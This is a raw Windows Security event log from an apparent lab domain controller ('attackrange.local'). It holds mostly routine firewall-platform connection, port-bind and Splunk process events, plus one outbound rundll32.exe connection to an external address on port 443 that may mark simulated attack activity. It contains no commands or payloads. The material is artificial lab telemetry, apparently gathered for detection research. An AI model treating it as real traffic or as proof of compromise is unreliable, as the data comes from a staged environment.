Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		58273
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:54:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382376
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		58273
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382375
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60288
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382374
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		65381
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382373
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		65381
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382372
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		65381
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382371
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		65381
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382381
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55148
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382380
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55148
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382379
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		65381
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:54:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382378
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		65381
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382382
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60981
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382384
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55149
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382383
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55149
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382385
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59363
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:55 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382386
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59725
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382388
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2140
	Application Name:	\device\harddiskvolume1\windows\system32\rundll32.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55150
	Destination Address:	34.218.235.219
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382387
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2140
	Application Name:	\device\harddiskvolume1\windows\system32\rundll32.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55150
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:58 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382390
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55151
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:58 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382389
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55151
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:59 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382395
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60278
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:59 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382394
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		50421
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:59 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382393
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		50421
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:59 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382392
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		50421
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:59 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382391
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		50421
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382397
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		50421
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382396
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		50421
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382399
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		6484
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\bin\splunkd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55152
	Destination Address:	10.0.1.12
	Destination Port:		8089
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382398
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		6484
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\bin\splunkd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55152
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382404
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60428
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382403
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		56111
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382402
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		56111
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382401
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		56111
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382400
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		56111
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:03 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382406
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		56111
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:03 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382405
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		56111
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:04 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382408
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55153
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:04 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382407
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55153
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382410
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x2238
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
	Exit Status:	0x1
03/01/2021 10:55:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382409
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2238
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382414
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x10a4
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382413
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59367
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382412
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1a74
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
	Exit Status:	0x1
03/01/2021 10:55:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382411
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1a74
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
